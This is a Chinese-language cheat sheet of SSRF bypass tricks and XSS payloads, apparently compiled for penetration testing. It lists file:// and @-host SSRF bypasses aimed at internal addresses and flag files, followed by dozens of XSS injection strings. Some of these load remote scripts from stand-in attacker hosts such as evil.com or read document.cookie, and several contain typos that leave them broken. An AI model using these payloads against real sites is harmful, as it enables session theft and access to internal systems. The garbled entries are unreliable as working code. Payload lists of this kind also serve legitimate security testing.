## SSRF&XSS
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

工具：https://github.com/ethicalhackingplayground/ssrf-king
## 常用绕过 payload等
```

admin=1&url=file://www.ichunqiu.com/var/www/html/flag.php
file://user@evil.com:80@www.google.com//var/www/html/index.php%23
使用@：http://A.com@10.10.10.10 = 10.10.10.10
IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
端口绕过：ip后面加一个端口
xip.io：10.0.0.1.xip.io = 10.0.0.1
        www.10.0.0.1.xip.io = 10.0.0.1
        mysite.10.0.0.1.xip.io = 10.0.0.1
        foo.bar.10.0.0.1.xip.io = 10.0.0.1
       
```
## XSS

## 常见payload

```
高版本的jQuery 可以使用sourceMappingURL来加载
- </textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>
- <script>alert(1);</script>
- <img src=0 onerror=alert(1)>
- "><script src=http://www.xxx.com/1.js></script>"
- "></iframe><script>alert(123)></script>
- <body onLoad="while(true) alert("XSS"),">
- "></tile><script>alert(1111)</script>
- </textarea>'"><script>alert(document.cookie)</script>
- '""><script language="JavaScript"> alert("X \nS \nS"),</script>
- </script></script><<<<script><>>>><<<script>alert(123)</script>
- <html><noalert><noscript>(123)</noscript><script>(123)</script>
- <INPUTTYPE="IMAGE"SRC="javasctipt:alert("XSS");">
- '></select><script>alert(123)</script>
- '>'><script src='http://www.evil.com/XSS.js'></script>
- }</style><script>a=eval;b=alert;a(b(/XSS/.source));</- script>
- <SCRIPT>document.write("XSS");</SCRIPT>
- a="get";b="URL";c="javascript:";d="alert("XSS");";eval(a- +b+c+d);
- ='><script>alert("XSS")</script>
- <sctipt+src=">"+src="http://www.evil.com/XSS.js?68,- 69"></script>
- <body backgroud=javascript:'"><script>alert- (navigator.userAgent)</sctipt>></body>
- ">XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/X
- Data:text/html;charset=utf-7;base64.Ij481.3RpdGod- [jxzY3JpcHQ+YWxlcnQoMIMzNy
- "<marquee><img src=k.png onerror=alert(/XSS/)/>
- "<marquee><img src=k onerror=alert(/XSS/)>
- '"><marquee><img src=k.png onerror=alert(/XSS/.source)/>
- </div><script>alert(123)</script>
- "><iframe src="javascript:alert(document.cookie)- '><iframe>
- <div style="backgroud:url("javascript:alert(I)')">
- <img src="java\nascript:alert(\"XSS\")">
- >"><img src="javascript:alert("XSS")">
- "style="background:url(javascript:alert(/XSS/))"
- >"><script>alert(/XSS/)</script>
- "></title><script>alert(I)</script>
```
反射XSS:欺骗用户点击，可能会被浏览器过滤

## 其他资料

- https://xianzhi.aliyun.com/forum/topic/83/
- http://kuza55.blogspot.hk/2008/02/csrf-ing-file-upload-fields.html